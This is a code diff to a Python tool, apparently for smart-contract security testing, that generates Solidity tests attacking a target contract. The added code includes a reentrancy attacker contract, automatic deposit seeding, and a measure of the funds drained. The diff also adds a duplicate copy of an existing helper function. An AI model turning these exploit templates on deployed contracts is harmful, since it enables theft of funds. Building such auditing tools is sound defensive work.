@@ -135,6 +135,12 @@ SIGNATURE_RE = re.compile(
 )
 
 CALLBACK_RE = re.compile(r"(?i)(callback|hook|receiver|fallback|receive|on[A-Z])")
+ACCESS_RE = re.compile(
+    r"(?i)(owner|admin|guardian|pause|unpause|upgrade|initialize|grant|revoke|"
+    r"renounce|rescue|sweep|emergency|set[A-Za-z]|configure|mint|burn|"
+    r"withdraw|claim|redeem|release|unlock|payout|execute)"
+)
+SETUP_RE = re.compile(r"(?i)^(deposit|seed|fund|topUp|top_up|stake|credit)$")
 
 
 @dataclass
@@ -781,7 +787,37 @@ def _basic_solidity_expr(ptype: str, value: str) -> str:
     raise ValueError(f"complex ABI type '{ptype}' needs a specialized attack generator")
 
 
-def _render_reentrancy_test(target: Target, fn: dict[str, Any], signature: str, values: list[str], depth: int):
+def _basic_solidity_expr(ptype: str, value: str) -> str:
+    raw = str(value)
+    lower = ptype.lower()
+    if lower == "address":
+        return f"address({raw})"
+    if lower == "bool":
+        return "true" if raw.lower() == "true" else "false"
+    if lower.startswith(("uint", "int", "bytes")):
+        return raw
+    raise ValueError(f"complex ABI type '{ptype}' needs a specialized attack generator")
+
+
+def _find_setup_signature(functions: list[dict[str, Any]]) -> str | None:
+    for item in functions:
+        if not isinstance(item, dict):
+            continue
+        name = str(item.get("name") or "")
+        inputs = item.get("inputs") or []
+        if SETUP_RE.search(name) and len(inputs) == 0 and str(item.get("stateMutability") or "") == "payable":
+            return _format_signature(item)
+    return None
+
+
+def _render_reentrancy_test(
+    target: Target,
+    fn: dict[str, Any],
+    signature: str,
+    values: list[str],
+    depth: int,
+    setup_signature: str | None = None,
+):
     target_lit = f"address(0x{target.address[2:]})"
     params = list(fn.get("inputs") or [])
     expressions = [
@@ -796,16 +832,26 @@ def _render_reentrancy_test(target: Target, fn: dict[str, Any], signature: str, 
         f'abi.encodeWithSignature("{signature}", {", ".join(encoded_args)})'
         if encoded_args else f'abi.encodeWithSignature("{signature}")'
     )
+    setup_block = ""
+    if setup_signature:
+        setup_block = f"""
+        bytes memory setupData = abi.encodeWithSignature("{setup_signature}");
+        (bool seeded, ) = TARGET.call{{value: 2 wei}}(setupData);
+        console2.log("SETUP_SEEDED", seeded);
+"""
 
     return _render_common_header() + f"""
 contract LowkeyBreakReentrant {{
     address public immutable target;
-    bytes public immutable payload;
+    bytes public payload;
     uint256 public attempts;
     uint256 public successes;
 
-    constructor(address _target, bytes memory _payload) {{
+    constructor(address _target) {{
         target = _target;
+    }}
+
+    function setPayload(bytes calldata _payload) external {{
         payload = _payload;
     }}
 
@@ -834,11 +880,11 @@ contract LowkeyBreakReentrancy is Test {{
     address constant TARGET = {target_lit};
 
     function test_break_reentrancy() public {{
-        LowkeyBreakReentrant hostile;
+        LowkeyBreakReentrant hostile = new LowkeyBreakReentrant(TARGET);
         bytes memory payload = {payload_expr};
-        hostile = new LowkeyBreakReentrant(TARGET, payload);
+        hostile.setPayload(payload);
         vm.deal(address(hostile), 100 ether);
-
+{setup_block}
         uint256 beforeHostile = address(hostile).balance;
         uint256 beforeTarget = TARGET.balance;
 
@@ -858,14 +904,13 @@ contract LowkeyBreakReentrancy is Test {{
         console2.log("ATTACKER_RECEIVED", received);
         console2.log("TARGET_LOSS", targetLoss);
 
-        if (hostile.successes() > 0 && received > 0 && targetLoss > 0) {{
+        if (hostile.successes() > 0 && received > 1 wei && targetLoss > 1 wei) {{
             console2.log("LOWKEY_BREAK", true);
         }} else {{
             console2.log("LOWKEY_BREAK", false);
         }}
     }}
 }}
-
 
 def _result_from_output(
     host,
@@ -879,7 +924,8 @@ def _result_from_output(
     text_output = str(output or "")
     found = re.search(r"LOWKEY_BREAK\s+(true|false)", text_output, flags=re.I)
     is_break = bool(found and found.group(1).lower() == "true")
-    status = "BREAK" if is_break else ("OBSERVED" if "LOWKEY_BREAK_FAMILY" in text_output else "BLOCKED")
+    structured = "LOWKEY_BREAK_FAMILY" in text_output
+    status = "BREAK" if is_break else ("OBSERVED" if structured else "BLOCKED")
     summary = {
         "BREAK": "Concrete break condition reached.",
         "OBSERVED": "Attack executed; no concrete break condition reached.",
@@ -992,21 +1038,20 @@ def _run_family(host, config, rpc: str, target: Target, fn: dict[str, Any], fami
     elif family == "time":
         body = _render_time_test(target, signature, calldata, value)
     elif family == "reentrancy":
-        # Reentrancy is only attempted against scalar/array-free signatures with
-        # at least one simple ABI type. The target call itself uses the exact same
-        # concrete calldata. This catches msg.sender-based ETH withdrawal paths.
         if any(
-            str(item.get("type") or "").startswith(("tuple", "bytes", "string"))
-            or str(item.get("type") or "").endswith("[]")
+            str(item.get("type") or "").lower().startswith(("tuple", "bytes", "string"))
+            or str(item.get("type") or "").lower().endswith("[]")
             for item in (fn.get("inputs") or [])
         ):
             return AttackResult(
                 family, target.contract, target.address, signature, "BLOCKED",
-                "Generic reentrancy payload generation is deferred for complex ABI types.",
+                "Generic reentrancy generation needs only simple ABI types.",
             )
         try:
+            all_functions = _discover_functions(host, config, target)
+            setup_signature = _find_setup_signature(all_functions)
             body = _render_reentrancy_test(
-                target, fn, signature, values, opts.get("depth", 3)
+                target, fn, signature, values, opts.get("depth", 3), setup_signature
             )
         except ValueError as error:
             return AttackResult(
@@ -1077,7 +1122,9 @@ def _families_for_function(fn: dict[str, Any], requested: str | None) -> list[st
 
     name = str(fn.get("name") or "")
     signature = _format_signature(fn)
-    families = ["reentrancy", "replay", "accounting", "access", "boundary"]
+    families = ["reentrancy", "replay", "accounting", "boundary"]
+    if ACCESS_RE.search(name):
+        families.append("access")
     if UPGRADE_RE.search(name):
         families.append("upgrade")
     if TIME_RE.search(name) or TIME_RE.search(signature):
